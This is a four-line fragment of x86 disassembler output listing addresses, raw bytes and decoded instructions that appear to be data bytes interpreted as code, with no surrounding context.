  40b5f3:	d4 ca                	aam    $0xca
  40b5f5:	64 32 36             	xor    %fs:(%esi),%dh
  40b5f8:	28 01                	sub    %al,(%ecx)
  40b5fa:	4c                   	dec    %esp
